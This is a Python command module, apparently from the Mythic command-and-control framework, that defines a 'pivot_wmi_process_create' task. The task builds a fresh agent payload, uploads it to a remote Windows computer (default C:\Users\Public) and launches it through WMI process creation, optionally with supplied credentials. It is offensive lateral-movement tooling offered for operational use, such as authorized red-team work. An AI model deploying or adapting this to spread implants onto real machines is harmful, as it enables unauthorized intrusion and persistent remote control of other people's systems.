from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *
import base64

class PivotWMIProcessCreaterguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "computer": CommandParameter(name="Computer", type=ParameterType.String, description="Computer to pivot to."),
            "template": CommandParameter(name="Payload Template", type=ParameterType.Payload),
            "remote_path": CommandParameter(name="Remote Path of Executable", type=ParameterType.String, required=False,
                              description="Path to drop the executable (default: C:\\Users\\Public)", default_value="C:\\Users\\Public"),
            "credential": CommandParameter(name="Credential", type=ParameterType.Credential_JSON, required=False)
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON arguments, but got raw command line.")
        self.load_args_from_json_string(self.command_line)


class PivotWMIProcessCreateCommand(CommandBase):
    cmd = "pivot_wmi_process_create"
    needs_admin = False
    help_cmd = "pivot_wmi_process_create (modal popup)"
    description = "Attempt to spawn an agent on a remote computer using WMI Process Create call."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PivotWMIProcessCreaterguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        temp = await MythicRPC().execute("get_payload", payload_uuid=task.args.get_arg("template"))
        gen_resp = await MythicRPC().execute("create_payload_from_uuid",
                                             task_id=task.id,
                                             payload_uuid=task.args.get_arg('template'),
                                             new_description="{}'s callback from WMI pivot (task: {})".format(task.operator, str(task.id)))
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"])
                if resp.status == MythicStatus.Success:
                    if resp.build_phase == 'success':
                        # it's done, so we can register a file for it
                        task.args.add_arg("template", resp.response["file"]['agent_file_id'])
                        task.display_params = "Uploading payload '{}' to {} on {}".format(temp.response["tag"], task.args.get_arg("remote_path"), task.args.get_arg("computer"))
                        break
                    elif resp.build_phase == 'error':
                        raise Exception("Failed to build new payload: " + resp.error_message)
                    else:
                        await asyncio.sleep(1)
        else:
            raise Exception("Error occurred while building payload: {}".format(gen_resp.error_message))

        return task

    async def process_response(self, response: AgentResponse):
        pass
